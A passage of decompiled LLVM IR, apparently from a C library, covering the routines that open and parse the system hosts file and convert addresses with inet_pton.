  uselistorder label %dec_label_pc_80505b8, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_80505d5 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_8052de5.416 to i32), i32 ptrtoint (i32* @global_var_8052db0.403 to i32))
  store i32 %v3_80505d5, i32* @eax, align 4
  %v1_80505dd = icmp eq i32 %v3_80505d5, 0
  %v1_80505df = icmp eq i1 %v1_80505dd, false
  br i1 %v1_80505df, label %dec_label_pc_80505f5, label %dec_label_pc_80505e1

dec_label_pc_80505e1:                             ; preds = %entry
  %v3_80505ed = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8052df0.417 to i32), i32 ptrtoint (i32* @global_var_8052db0.403 to i32))
  br label %dec_label_pc_80505f5

dec_label_pc_80505f5:                             ; preds = %entry, %dec_label_pc_80505e1
  %v0_80505f8 = phi i32 [ %v3_80505d5, %entry ], [ %v3_80505ed, %dec_label_pc_80505e1 ]
  ret i32 %v0_80505f8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 1, 0, 3, 2, 7, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8052db0.403 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_80505f5, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80505f9 = load i32, i32* @ebp, align 4
  %v0_80505fa = load i32, i32* @edi, align 4
  %v0_80505fb = load i32, i32* @esi, align 4
  %v0_80505fc = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_805060a = sub i32 0, %arg6
  %v1_805060c = urem i32 %v1_805060a, 4
  %v2_805060c = icmp eq i32 %v1_805060c, 0
  store i32 %v1_805060c, i32* %eax.global-to-local, align 4
  br i1 %v2_805060c, label %dec_label_pc_805061d, label %dec_label_pc_8050611

dec_label_pc_8050611:                             ; preds = %entry
  %v2_8050611 = sub i32 %arg7, %v1_805060c
  %v7_8050611 = icmp ugt i32 %v1_805060c, %arg7
  br i1 %v7_8050611, label %dec_label_pc_80508c1, label %dec_label_pc_8050619

dec_label_pc_8050619:                             ; preds = %dec_label_pc_8050611
  %v2_8050619 = add i32 %v1_805060c, %arg6
  store i32 %v2_8050619, i32* @ebx, align 4
  store i32 %v2_8050611, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805061d

dec_label_pc_805061d:                             ; preds = %entry, %dec_label_pc_8050619
  %v0_805062b = phi i32 [ %arg6, %entry ], [ %v2_8050619, %dec_label_pc_8050619 ]
  %v0_8050632 = phi i32 [ %arg7, %entry ], [ %v2_8050611, %dec_label_pc_8050619 ]
  %tmp = icmp ult i32 %v0_8050632, 32
  br i1 %tmp, label %dec_label_pc_80508c1, label %dec_label_pc_8050626

dec_label_pc_8050626:                             ; preds = %dec_label_pc_805061d
  %v12_8050626 = icmp eq i32 %arg4, 1
  %v1_805062b = add i32 %v0_805062b, 32
  store i32 %v1_805062b, i32* %eax.global-to-local, align 4
  %v1_8050632 = add i32 %v0_8050632, -32
  store i32 %v1_8050632, i32* @ebp, align 4
  br i1 %v12_8050626, label %dec_label_pc_8050626.dec_label_pc_8050771_crit_edge, label %dec_label_pc_805063b

dec_label_pc_8050626.dec_label_pc_8050771_crit_edge: ; preds = %dec_label_pc_8050626
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8050771

dec_label_pc_805063b:                             ; preds = %dec_label_pc_8050626
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8050642 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8050642, align 4
  %tmp144 = icmp ult i32 %v1_8050632, 4
  br i1 %tmp144, label %dec_label_pc_80508c1, label %dec_label_pc_805064e

dec_label_pc_805064e:                             ; preds = %dec_label_pc_805063b
  %v0_805064e = load i32, i32* %edx.global-to-local, align 4
  %v1_805064e = add i32 %v0_805064e, -36
  store i32 %v1_805064e, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_805064e, 8
  br i1 %tmp145, label %dec_label_pc_80508c1, label %dec_label_pc_805065a

dec_label_pc_805065a:                             ; preds = %dec_label_pc_805064e
  %v0_805065a = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_805065a, 16
  br i1 %tmp146, label %dec_label_pc_80508c1, label %dec_label_pc_8050663

dec_label_pc_8050663:                             ; preds = %dec_label_pc_805065a
  %v1_8050663 = add i32 %v0_805064e, -48
  store i32 %v1_8050663, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_8050663, 8
  br i1 %tmp147, label %dec_label_pc_80508c1, label %dec_label_pc_805066f

dec_label_pc_805066f:                             ; preds = %dec_label_pc_8050663
  %v0_805066f = load i32, i32* @ebx, align 4
  %v1_805066f = add i32 %v0_805066f, 48
  %v1_8050672 = add i32 %v0_805064e, -44
  store i32 %v1_8050672, i32* @ebp, align 4
  %v1_8050679 = add i32 %v0_805064e, -56
  store i32 %v1_8050679, i32* @eax, align 4
  %v7_805067c = icmp ult i32 %v1_8050679, %v1_8050672
  %v1_805067e = add i32 %v0_805066f, 36
  store i32 %v1_805067e, i32* @edi, align 4
  br i1 %v7_805067c, label %dec_label_pc_8050688, label %dec_label_pc_8050683

dec_label_pc_8050683:                             ; preds = %dec_label_pc_805066f
  %v1_8050683 = add i32 %v0_805066f, 44
  store i32 %v1_8050683, i32* @esi, align 4
  br label %dec_label_pc_805068d

dec_label_pc_8050688:                             ; preds = %dec_label_pc_805066f
  %v1_8050688 = add i32 %v0_805066f, 56
  store i32 %v1_8050688, i32* @esi, align 4
  store i32 %v1_8050679, i32* @ebp, align 4
  br label %dec_label_pc_805068d

dec_label_pc_805068d:                             ; preds = %dec_label_pc_8050683, %dec_label_pc_8050688
  %v0_805068d = phi i32 [ %v1_8050672, %dec_label_pc_8050683 ], [ %v1_8050679, %dec_label_pc_8050688 ]
  %tmp148 = icmp ult i32 %v0_805068d, 80
  br i1 %tmp148, label %dec_label_pc_80508c1, label %dec_label_pc_8050696

dec_label_pc_8050696:                             ; preds = %dec_label_pc_805068d
  %v0_8050696 = call i32 @__open_etc_hosts()
  store i32 %v0_8050696, i32* %eax.global-to-local, align 4
  %v1_805069b = icmp eq i32 %v0_8050696, 0
  br i1 %v1_805069b, label %dec_label_pc_80506c3, label %dec_label_pc_80506a3

dec_label_pc_80506a3:                             ; preds = %dec_label_pc_8050696
  store i32 %v1_805062b, i32* %edx.global-to-local, align 4
  store i32 %v1_805066f, i32* %eax.global-to-local, align 4
  %v0_80506ab = load i32, i32* @edi, align 4
  %v0_80506af = load i32, i32* @esi, align 4
  %v4_80506b3 = inttoptr i32 %v1_805062b to i8*
  br label %dec_label_pc_8050771

dec_label_pc_80506c3:                             ; preds = %dec_label_pc_8050696
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_80506c7 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_80506c7, align 4
  %v1_80506cd = call i32 @__errno_location(i32 0)
  store i32 %v1_80506cd, i32* %eax.global-to-local, align 4
  %v1_80506d2 = inttoptr i32 %v1_80506cd to i32*
  %v2_80506d2 = load i32, i32* %v1_80506d2, align 4
  store i32 %v2_80506d2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508c1

dec_label_pc_80506dd:                             ; preds = %dec_label_pc_8050844
  %v2_80506dd = load i8*, i8** %stack_var_-44, align 4
  %v3_80506dd = ptrtoint i8* %v2_80506dd to i32
  store i32 %v3_80506dd, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_80506e4 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_80506dd, i32* %v2_80506e4, align 4
  %v0_80506e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506e6 = add i32 %v0_80506e6, 4
  %v2_80506e6 = inttoptr i32 %v1_80506e6 to i32*
  store i32 0, i32* %v2_80506e6, align 4
  %v0_80506ed = load i32, i32* @ebx, align 4
  %v1_80506ed = add i32 %v0_80506ed, 4
  %v2_80506ed = inttoptr i32 %v1_80506ed to i32*
  %v3_80506ed = load i32, i32* %v2_80506ed, align 4
  store i32 %v3_80506ed, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80506ed, i32* %arg5, align 4
  %v1_80506f6 = add i32 %tmp60, 8
  %v2_80506f6 = inttoptr i32 %v1_80506f6 to i32*
  store i32 2, i32* %v2_80506f6, align 4
  %v0_80506fd = load i32, i32* %edx.global-to-local, align 4
  %v1_80506fd = add i32 %v0_80506fd, 12
  %v2_80506fd = inttoptr i32 %v1_80506fd to i32*
  store i32 4, i32* %v2_80506fd, align 4
  br label %dec_label_pc_8050736

dec_label_pc_805070a:                             ; preds = %dec_label_pc_8050866
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_8050712 = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8050712, align 4
  %v0_8050714 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050714 = add i32 %v0_8050714, 4
  %v2_8050714 = inttoptr i32 %v1_8050714 to i32*
  store i32 0, i32* %v2_8050714, align 4
  %v0_805071b = load i32, i32* @ebx, align 4
  %v1_805071b = add i32 %v0_805071b, 4
  %v2_805071b = inttoptr i32 %v1_805071b to i32*
  %v3_805071b = load i32, i32* %v2_805071b, align 4
  store i32 %v3_805071b, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_805071b, i32* %arg5, align 4
  %v1_8050724 = add i32 %tmp60, 8
  %v2_8050724 = inttoptr i32 %v1_8050724 to i32*
  store i32 10, i32* %v2_8050724, align 4
  %v0_805072b = load i32, i32* %edx.global-to-local, align 4
  %v1_805072b = add i32 %v0_805072b, 12
  %v2_805072b = inttoptr i32 %v1_805072b to i32*
  store i32 16, i32* %v2_805072b, align 4
  br label %dec_label_pc_8050736

dec_label_pc_8050736:                             ; preds = %dec_label_pc_80506dd, %dec_label_pc_805070a
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_80506dd ], [ %storemerge3, %dec_label_pc_805070a ]
  %v1_8050736 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050736 = add i32 %v1_8050736, 16
  %v3_8050736 = inttoptr i32 %v2_8050736 to i32*
  store i32 %storemerge, i32* %v3_8050736, align 4
  %v0_8050739 = load i32, i32* @ebx, align 4
  %v1_8050739 = add i32 %v0_8050739, 8
  %v1_805073c = load i32, i32* %edx.global-to-local, align 4
  %v2_805073c = add i32 %v1_805073c, 4
  %v3_805073c = inttoptr i32 %v2_805073c to i32*
  store i32 %v1_8050739, i32* %v3_805073c, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8050743 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050743 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8050743, i32* %v2_8050743, align 4
  br label %dec_label_pc_80508a1

dec_label_pc_8050771:                             ; preds = %dec_label_pc_8050626.dec_label_pc_8050771_crit_edge, %dec_label_pc_80506a3
  %v1_8050775.pre-phi = phi i32* [ %.pre, %dec_label_pc_8050626.dec_label_pc_8050771_crit_edge ], [ %v1_8050642, %dec_label_pc_80506a3 ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_8050626.dec_label_pc_8050771_crit_edge ], [ %v4_80506b3, %dec_label_pc_80506a3 ]
  %stack_var_-20.0.in = phi i32 [ %v1_805062b, %dec_label_pc_8050626.dec_label_pc_8050771_crit_edge ], [ %v0_80506af, %dec_label_pc_80506a3 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8050626.dec_label_pc_8050771_crit_edge ], [ %v1_805062b, %dec_label_pc_80506a3 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_8050626.dec_label_pc_8050771_crit_edge ], [ %v0_80506ab, %dec_label_pc_80506a3 ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_8050626.dec_label_pc_8050771_crit_edge ], [ %v0_8050696, %dec_label_pc_80506a3 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8050626.dec_label_pc_8050771_crit_edge ], [ %v1_805066f, %dec_label_pc_80506a3 ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8050775.pre-phi, align 4
  %v12_80507ff = icmp eq i32 %arg4, 2
  %v2_805082a = inttoptr i32 %arg2 to i8*
  %v12_805083d = icmp eq i32 %arg3, 2
  %v12_805085f = icmp eq i32 %arg3, 10
  %v1_8050809 = icmp eq i1 %v12_80507ff, false
  %v1_8050842 = icmp eq i1 %v12_805083d, false
  %v1_8050864 = icmp eq i1 %v12_805085f, false
  br label %dec_label_pc_8050887.outer

dec_label_pc_8050887.outer:                       ; preds = %dec_label_pc_805085f, %dec_label_pc_8050866, %dec_label_pc_8050844, %dec_label_pc_8050771
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8050771 ], [ 2, %dec_label_pc_8050844 ], [ 2, %dec_label_pc_8050866 ], [ 2, %dec_label_pc_805085f ]
  br label %dec_label_pc_8050887

dec_label_pc_8050788:                             ; preds = %dec_label_pc_8050887
  %v5_8050790 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35, i32 %v3_8050891, i32 %v3_8050891)
  store i32 %v5_8050790, i32* @eax, align 4
  %v1_8050798 = icmp eq i32 %v5_8050790, 0
  br i1 %v1_8050798, label %dec_label_pc_805079f, label %dec_label_pc_805079c

dec_label_pc_805079c:                             ; preds = %dec_label_pc_8050788
  %v1_805079c = inttoptr i32 %v5_8050790 to i8*
  store i8 0, i8* %v1_805079c, align 1
  br label %dec_label_pc_805079f

dec_label_pc_805079f:                             ; preds = %dec_label_pc_8050788, %dec_label_pc_805079c
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_80507df34 = load i8, i8* %stack_var_-20.0, align 1
  %v3_80507df35 = icmp eq i8 %v2_80507df34, 0
  %v1_80507e241 = icmp eq i1 %v3_80507df35, false
  br i1 %v1_80507e241, label %dec_label_pc_80507ab.preheader.preheader, label %dec_label_pc_80507e4

dec_label_pc_80507ab.preheader.preheader:         ; preds = %dec_label_pc_805079f
  %v4_80507ab98.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80507ab.preheader

dec_label_pc_80507a7:                             ; preds = %dec_label_pc_80507b1
  store i8 0, i8* %v1_80507ab104, align 1
  %v0_80507aa = load i32, i32* @ecx, align 4
  %v1_80507aa = add i32 %v0_80507aa, 1
  store i32 %v1_80507aa, i32* @ecx, align 4
  %v1_80507ab = inttoptr i32 %v1_80507aa to i8*
  %v2_80507ab = load i8, i8* %v1_80507ab, align 1
  %v3_80507ab = zext i8 %v2_80507ab to i32
  %v4_80507ab = load i32, i32* %eax.global-to-local, align 4
  %v5_80507ab = and i32 %v4_80507ab, -256
  %v6_80507ab = or i32 %v5_80507ab, %v3_80507ab
  store i32 %v6_80507ab, i32* @eax, align 4
  %v4_80507ad = icmp eq i8 %v2_80507ab, 0
  br i1 %v4_80507ad, label %dec_label_pc_80507ab.dec_label_pc_80507e4.loopexit_crit_edge, label %dec_label_pc_80507b1

dec_label_pc_80507b1:                             ; preds = %dec_label_pc_80507ab.preheader, %dec_label_pc_80507a7
  %v2_80507ab105 = phi i8 [ %v2_80507ab, %dec_label_pc_80507a7 ], [ %v2_80507ab96, %dec_label_pc_80507ab.preheader ]
  %v1_80507ab104 = phi i8* [ %v1_80507ab, %dec_label_pc_80507a7 ], [ %v1_80507ab95, %dec_label_pc_80507ab.preheader ]
  %v0_80507a7103 = phi i32 [ %v1_80507aa, %dec_label_pc_80507a7 ], [ %v0_80507ab49, %dec_label_pc_80507ab.preheader ]
  %v2_80507b1 = sext i8 %v2_80507ab105 to i32
  store i32 %v2_80507b1, i32* @edx, align 4
  %v0_80507b4 = load i32, i32* @global_var_8053720, align 32
  store i32 %v0_80507b4, i32* %eax.global-to-local, align 4
  %v2_80507b9 = mul nsw i32 %v2_80507b1, 2
  %v3_80507b9 = add i32 %v0_80507b4, %v2_80507b9
  %v4_80507b9 = inttoptr i32 %v3_80507b9 to i8*
  %v5_80507b9 = load i8, i8* %v4_80507b9, align 1
  %v6_80507b9 = and i8 %v5_80507b9, 32
  %v7_80507b9 = icmp eq i8 %v6_80507b9, 0
  %v1_80507bd = icmp eq i1 %v7_80507b9, false
  br i1 %v1_80507bd, label %dec_label_pc_80507a7, label %dec_label_pc_80507bf

dec_label_pc_80507bf:                             ; preds = %dec_label_pc_80507b1
  %v0_80507bf = load i32, i32* @edi, align 4
  %v1_80507bf = add i32 %v0_80507bf, -6
  %v6_80507bf = sub i32 5, %v0_80507bf
  %v7_80507bf = and i32 %v6_80507bf, %v0_80507bf
  %v8_80507bf = icmp slt i32 %v7_80507bf, 0
  %v9_80507bf = icmp eq i32 %v1_80507bf, 0
  %v10_80507bf = icmp slt i32 %v1_80507bf, 0
  %v3_80507c2 = icmp eq i1 %v10_80507bf, %v8_80507bf
  %v4_80507c2 = icmp eq i1 %v9_80507bf, false
  %v5_80507c2 = and i1 %v4_80507c2, %v3_80507c2
  br i1 %v5_80507c2, label %dec_label_pc_80507cb.preheader, label %dec_label_pc_80507c4

dec_label_pc_80507c4:                             ; preds = %dec_label_pc_80507bf
  %v1_80507c4 = load i32, i32* @ebx, align 4
  %v3_80507c4 = mul i32 %v0_80507bf, 4
  %v4_80507c4 = add i32 %v1_80507c4, %v3_80507c4
  %v5_80507c4 = inttoptr i32 %v4_80507c4 to i32*
  store i32 %v0_80507a7103, i32* %v5_80507c4, align 4
  %v0_80507c7 = load i32, i32* @edi, align 4
  %v1_80507c7 = add i32 %v0_80507c7, 1
  store i32 %v1_80507c7, i32* @edi, align 4
  %v0_80507cb.pre.pre = load i32, i32* @ecx, align 4
  %v4_80507cb.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80507cb.preheader

dec_label_pc_80507cb.preheader:                   ; preds = %dec_label_pc_80507c4, %dec_label_pc_80507bf
  %v4_80507cb.pre = phi i32 [ %v4_80507cb.pre.pre, %dec_label_pc_80507c4 ], [ %v0_80507b4, %dec_label_pc_80507bf ]
  %v0_80507cb.pre = phi i32 [ %v0_80507cb.pre.pre, %dec_label_pc_80507c4 ], [ %v0_80507a7103, %dec_label_pc_80507bf ]
  %v0_80507e454 = phi i32 [ %v1_80507c7, %dec_label_pc_80507c4 ], [ %v0_80507bf, %dec_label_pc_80507bf ]
  %v1_80507cb106 = inttoptr i32 %v0_80507cb.pre to i8*
  %v2_80507cb107 = load i8, i8* %v1_80507cb106, align 1
  %v3_80507cb108 = zext i8 %v2_80507cb107 to i32
  %v5_80507cb109 = and i32 %v4_80507cb.pre, -256
  %v6_80507cb110 = or i32 %v3_80507cb108, %v5_80507cb109
  store i32 %v6_80507cb110, i32* @eax, align 4
  %v4_80507cd111 = icmp eq i8 %v2_80507cb107, 0
  br i1 %v4_80507cd111, label %dec_label_pc_80507df.loopexit, label %dec_label_pc_80507d1.lr.ph

dec_label_pc_80507d1.lr.ph:                       ; preds = %dec_label_pc_80507cb.preheader
  %v0_80507d4.pre = load i32, i32* @global_var_8053720, align 32
  br label %dec_label_pc_80507d1

dec_label_pc_80507ca:                             ; preds = %dec_label_pc_80507d1
  %v1_80507ca = add i32 %v0_80507df113, 1
  store i32 %v1_80507ca, i32* @ecx, align 4
  %v1_80507cb = inttoptr i32 %v1_80507ca to i8*
  %v2_80507cb = load i8, i8* %v1_80507cb, align 1
  %v3_80507cb = zext i8 %v2_80507cb to i32
  %v5_80507cb = and i32 %v0_80507d4.pre, -256
  %v6_80507cb = or i32 %v3_80507cb, %v5_80507cb
  store i32 %v6_80507cb, i32* @eax, align 4
  %v4_80507cd = icmp eq i8 %v2_80507cb, 0
  br i1 %v4_80507cd, label %dec_label_pc_80507df.loopexit, label %dec_label_pc_80507d1

dec_label_pc_80507d1:                             ; preds = %dec_label_pc_80507d1.lr.ph, %dec_label_pc_80507ca
  %v2_80507cb115 = phi i8 [ %v2_80507cb107, %dec_label_pc_80507d1.lr.ph ], [ %v2_80507cb, %dec_label_pc_80507ca ]
  %v1_80507cb114 = phi i8* [ %v1_80507cb106, %dec_label_pc_80507d1.lr.ph ], [ %v1_80507cb, %dec_label_pc_80507ca ]
  %v0_80507df113 = phi i32 [ %v0_80507cb.pre, %dec_label_pc_80507d1.lr.ph ], [ %v1_80507ca, %dec_label_pc_80507ca ]
  %v2_80507d1 = sext i8 %v2_80507cb115 to i32
  store i32 %v2_80507d1, i32* @edx, align 4
  store i32 %v0_80507d4.pre, i32* @eax, align 4
  %v2_80507d9 = mul nsw i32 %v2_80507d1, 2
  %v3_80507d9 = add i32 %v0_80507d4.pre, %v2_80507d9
  %v4_80507d9 = inttoptr i32 %v3_80507d9 to i8*
  %v5_80507d9 = load i8, i8* %v4_80507d9, align 1
  %v6_80507d9 = and i8 %v5_80507d9, 32
  %v7_80507d9 = icmp eq i8 %v6_80507d9, 0
  br i1 %v7_80507d9, label %dec_label_pc_80507ca, label %dec_label_pc_80507df.loopexit

dec_label_pc_80507df.loopexit:                    ; preds = %dec_label_pc_80507d1, %dec_label_pc_80507ca, %dec_label_pc_80507cb.preheader
  %v4_80507ab98139 = phi i32 [ %v6_80507cb110, %dec_label_pc_80507cb.preheader ], [ %v6_80507cb, %dec_label_pc_80507ca ], [ %v0_80507d4.pre, %dec_label_pc_80507d1 ]
  %v0_80507df.lcssa = phi i32 [ %v0_80507cb.pre, %dec_label_pc_80507cb.preheader ], [ %v1_80507ca, %dec_label_pc_80507ca ], [ %v0_80507df113, %dec_label_pc_80507d1 ]
  %v1_80507cb.lcssa = phi i8* [ %v1_80507cb106, %dec_label_pc_80507cb.preheader ], [ %v1_80507cb, %dec_label_pc_80507ca ], [ %v1_80507cb114, %dec_label_pc_80507d1 ]
  %v2_80507df = load i8, i8* %v1_80507cb.lcssa, align 1
  %v3_80507df = icmp eq i8 %v2_80507df, 0
  %v1_80507e2 = icmp eq i1 %v3_80507df, false
  br i1 %v1_80507e2, label %dec_label_pc_80507ab.preheader, label %dec_label_pc_80507e4

dec_label_pc_80507ab.preheader:                   ; preds = %dec_label_pc_80507ab.preheader.preheader, %dec_label_pc_80507df.loopexit
  %v0_80507e4.pre142 = phi i32 [ %v0_80507e454, %dec_label_pc_80507df.loopexit ], [ 0, %dec_label_pc_80507ab.preheader.preheader ]
  %v4_80507ab98 = phi i32 [ %v4_80507ab98139, %dec_label_pc_80507df.loopexit ], [ %v4_80507ab98.pre, %dec_label_pc_80507ab.preheader.preheader ]
  %v0_80507ab49 = phi i32 [ %v0_80507df.lcssa, %dec_label_pc_80507df.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_80507ab.preheader.preheader ]
  %v1_80507ab95 = inttoptr i32 %v0_80507ab49 to i8*
  %v2_80507ab96 = load i8, i8* %v1_80507ab95, align 1
  %v3_80507ab97 = zext i8 %v2_80507ab96 to i32
  %v5_80507ab99 = and i32 %v4_80507ab98, -256
  %v6_80507ab100 = or i32 %v5_80507ab99, %v3_80507ab97
  store i32 %v6_80507ab100, i32* @eax, align 4
  %v4_80507ad101 = icmp eq i8 %v2_80507ab96, 0
  br i1 %v4_80507ad101, label %dec_label_pc_80507e4, label %dec_label_pc_80507b1

dec_label_pc_80507ab.dec_label_pc_80507e4.loopexit_crit_edge: ; preds = %dec_label_pc_80507a7
  %v0_80507e4.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80507e4

dec_label_pc_80507e4:                             ; preds = %dec_label_pc_80507df.loopexit, %dec_label_pc_80507ab.dec_label_pc_80507e4.loopexit_crit_edge, %dec_label_pc_80507ab.preheader, %dec_label_pc_805079f
  %v1_80507e7 = phi i32 [ 0, %dec_label_pc_805079f ], [ %v0_80507e4.pre.pre, %dec_label_pc_80507ab.dec_label_pc_80507e4.loopexit_crit_edge ], [ %v0_80507e4.pre142, %dec_label_pc_80507ab.preheader ], [ %v0_80507e454, %dec_label_pc_80507df.loopexit ]
  %v0_80507e7 = load i32, i32* @ebx, align 4
  %v2_80507e7 = mul i32 %v1_80507e7, 4
  %v3_80507e7 = add i32 %v0_80507e7, %v2_80507e7
  %v4_80507e7 = inttoptr i32 %v3_80507e7 to i32*
  store i32 0, i32* %v4_80507e7, align 4
  %v7_80507ee = icmp sgt i32 %v1_80507e7, 1
  br i1 %v7_80507ee, label %dec_label_pc_80507f4, label %dec_label_pc_8050887

dec_label_pc_80507f4:                             ; preds = %dec_label_pc_80507e4
  br i1 %v12_8050626, label %dec_label_pc_80508c1, label %dec_label_pc_80507ff

dec_label_pc_80507ff:                             ; preds = %dec_label_pc_80507f4
  store i32 1, i32* @esi, align 4
  br i1 %v1_8050809, label %dec_label_pc_8050837.preheader, label %dec_label_pc_805080b

dec_label_pc_8050837.preheader:                   ; preds = %dec_label_pc_80507ff
  %v1_8050837119 = load i32, i32* @edi, align 4
  %v5_8050839128 = icmp sgt i32 %v1_8050837119, 1
  br i1 %v5_8050839128, label %dec_label_pc_8050821.lr.ph, label %dec_label_pc_8050887

dec_label_pc_8050821.lr.ph:                       ; preds = %dec_label_pc_8050837.preheader
  br label %dec_label_pc_8050821

dec_label_pc_805080b:                             ; preds = %dec_label_pc_80507ff
  %v0_805080b = load i32, i32* @eax, align 4
  %v0_805080d = load i32, i32* @ebx, align 4
  %v1_805080d = inttoptr i32 %v0_805080d to i32*
  %v2_805080d = load i32, i32* %v1_805080d, align 4
  %v5_8050813 = call i32 @__GI_strcoll(i8* %v2_805082a, i32 %v2_805080d, i32 %v0_805080b, i32 %v0_805080b)
  store i32 %v5_8050813, i32* %eax.global-to-local, align 4
  %v1_805081b = icmp eq i32 %v5_8050813, 0
  %v1_805081d = icmp eq i1 %v1_805081b, false
  br i1 %v1_805081d, label %dec_label_pc_8050887, label %dec_label_pc_805083d

dec_label_pc_8050821:                             ; preds = %dec_label_pc_8050821.lr.ph, %dec_label_pc_8050836
  %v1_8050823129 = phi i32 [ 1, %dec_label_pc_8050821.lr.ph ], [ %v1_8050836, %dec_label_pc_8050836 ]
  %v0_8050823 = load i32, i32* @ebx, align 4
  %v2_8050823 = mul i32 %v1_8050823129, 4
  %v3_8050823 = add i32 %v0_8050823, %v2_8050823
  %v4_8050823 = inttoptr i32 %v3_8050823 to i32*
  %v5_8050823 = load i32, i32* %v4_8050823, align 4
  %v3_805082a = call i32 @__GI_strcasecmp(i8* %v2_805082a, i32 %v5_8050823)
  store i32 %v3_805082a, i32* %eax.global-to-local, align 4
  %v1_8050832 = icmp eq i32 %v3_805082a, 0
  br i1 %v1_8050832, label %dec_label_pc_805083d, label %dec_label_pc_8050836

dec_label_pc_8050836:                             ; preds = %dec_label_pc_8050821
  %v0_8050836 = load i32, i32* @esi, align 4
  %v1_8050836 = add i32 %v0_8050836, 1
  store i32 %v1_8050836, i32* @esi, align 4
  %v1_8050837 = load i32, i32* @edi, align 4
  %v5_8050839 = icmp slt i32 %v1_8050836, %v1_8050837
  br i1 %v5_8050839, label %dec_label_pc_8050821, label %dec_label_pc_8050887

dec_label_pc_805083d:                             ; preds = %dec_label_pc_805080b, %dec_label_pc_8050821
  br i1 %v1_8050842, label %dec_label_pc_805085f, label %dec_label_pc_8050844

dec_label_pc_8050844:                             ; preds = %dec_label_pc_805083d
  %v0_8050844 = load i32, i32* @esi, align 4
  %v3_8050845 = load i8*, i8** %stack_var_-44, align 4
  %v4_8050845 = ptrtoint i8* %v3_8050845 to i32
  %v0_8050849 = load i32, i32* @ebx, align 4
  %v1_8050849 = inttoptr i32 %v0_8050849 to i32*
  %v2_8050849 = load i32, i32* %v1_8050849, align 4
  %v4_805084d = inttoptr i32 %v2_8050849 to i8*
  %v5_805084d = call i32 @inet_pton(i32 2, i8* %v4_805084d, i32 %v4_8050845, i32 %v0_8050844)
  store i32 %v5_805084d, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_805084d, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_80506dd, label %dec_label_pc_8050887.outer

dec_label_pc_805085f:                             ; preds = %dec_label_pc_805083d
  br i1 %v1_8050864, label %dec_label_pc_8050887.outer, label %dec_label_pc_8050866

dec_label_pc_8050866:                             ; preds = %dec_label_pc_805085f
  %v0_8050866 = load i32, i32* @ecx, align 4
  %v0_805086b = load i32, i32* @ebx, align 4
  %v1_805086b = inttoptr i32 %v0_805086b to i32*
  %v2_805086b = load i32, i32* %v1_805086b, align 4
  %v4_805086f = inttoptr i32 %v2_805086b to i8*
  %v5_805086f = call i32 @inet_pton(i32 10, i8* %v4_805086f, i32 %stack_var_-36.0, i32 %v0_8050866)
  store i32 %v5_805086f, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_805086f, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_805070a, label %dec_label_pc_8050887.outer

